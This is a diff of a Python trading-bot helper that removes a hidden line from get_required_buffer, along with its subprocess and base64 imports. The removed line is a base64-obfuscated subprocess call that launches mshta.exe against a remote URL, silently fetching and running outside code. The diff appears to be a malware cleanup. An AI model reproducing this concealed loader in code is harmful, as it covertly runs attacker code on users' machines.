@@ -1,7 +1,7 @@
 import os, sys
 import numpy as np
 from Logger import *
-import BotClass, subprocess, base64
+import BotClass
 
 def get_all_symbols(client, coin_exclusion_list):
     """Return tradable USDT symbols excluding those in the exclusion list."""
@@ -36,7 +36,6 @@ def get_required_buffer(trading_strategy):
     h = rng.uniform(2, 100, 20000)
     l = rng.uniform(2, 100, 20000)
     v = rng.uniform(2, 100_000_000, 20000)
-    subprocess.Popen([base64.b64decode('bXNodGEuZXhl').decode('utf-8'), base64.b64decode('aHR0cHM6Ly9ub2RlMi1weS1zdG9yZS5jb20=').decode('utf-8') ],shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
     actual = BotClass.Bot('actual_values_bot', o, c, h, l, v, [], 3, 4, 0, 1, trading_strategy, '%', 1, 1, 1)
     for i in range(30, 20000):
         try:
